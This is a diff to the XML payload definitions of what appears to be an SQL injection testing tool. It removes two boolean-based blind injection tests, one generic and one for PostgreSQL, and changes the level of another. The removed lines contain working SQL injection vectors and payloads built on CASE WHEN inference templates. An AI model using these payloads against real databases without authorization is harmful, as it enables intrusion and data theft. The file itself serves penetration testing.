@@ -579,25 +579,9 @@ Formats:
 
     <!-- Boolean-based blind tests - Parameter replace -->
     <test>
-        <title>Generic boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))</comparison>
-        </response>
-    </test>
-
-    <test>
         <title>Generic boolean-based blind - Parameter replace (original value)</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
@@ -684,25 +668,6 @@ Formats:
         </response>
         <details>
             <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL boolean-based blind - Parameter replace (CBRT(LN(0)) - original value)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CBRT(LN(0)) END)</vector>
-        <request>
-            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CBRT(LN(0)) END)</payload>
-        </request>
-        <response>
-            <comparison>(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CBRT(LN(0)) END)</comparison>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
         </details>
     </test>
 
